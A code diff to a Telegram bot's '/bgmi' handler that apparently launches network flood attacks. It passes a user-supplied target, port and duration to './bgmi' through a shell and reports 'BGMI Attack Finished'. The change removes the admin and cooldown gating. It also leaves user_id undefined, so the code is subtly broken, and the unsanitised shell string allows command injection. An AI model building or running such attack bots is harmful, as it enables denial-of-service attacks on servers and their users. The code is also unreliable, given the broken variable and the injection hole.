@@ -119,38 +119,28 @@ def set_approval_expiry_date(user_id, duration, time_unit):
 # Command handler for adding a user with approval time
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
-    user_id = str(message.chat.id)
-    
-    # Check if the user is in admin_id (admins have no cooldown)
-    if user_id not in admin_id:
-        # Check if the user has run the command before and is still within the cooldown period
-        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-            response = "You Are On Cooldown ❌. Please Wait 10 sec Before Running The /bgmi Command Again."
-            bot.reply_to(message, response)
-            return
-        # Update the last time the user ran the command
-        bgmi_cooldown[user_id] = datetime.datetime.now()
+    # Remove the check for allowed_user_ids
+    # user_id = str(message.chat.id)
+    # if user_id in allowed_user_ids:
     
     command = message.text.split()
-    if len(command) == 4:  # Updated to accept target, time, and port
+    if len(command) == 4:
         target = command[1]
-        port = int(command[2])  # Convert port to integer
-        time = int(command[3])  # Convert time to integer
+        port = int(command[2])
+        time = int(command[3])
         if time > 600:
             response = "Error: Time interval must be less than 600."
         else:
             record_command_logs(user_id, '/bgmi', target, port, time)
             log_command(user_id, target, port, time)
-            start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+            start_attack_reply(message, target, port, time)
             full_command = f"./bgmi {target} {port} {time} 110"
             process = subprocess.run(full_command, shell=True)
             response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
-            bot.reply_to(message, response)  # Notify the user that the attack is finished
+            bot.reply_to(message, response)
     else:
-        response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
-
+        response = "✅ Usage :- /bgmi <target> <port> <time>"
     bot.reply_to(message, response)
-
 
 
 # Function to log command to the file
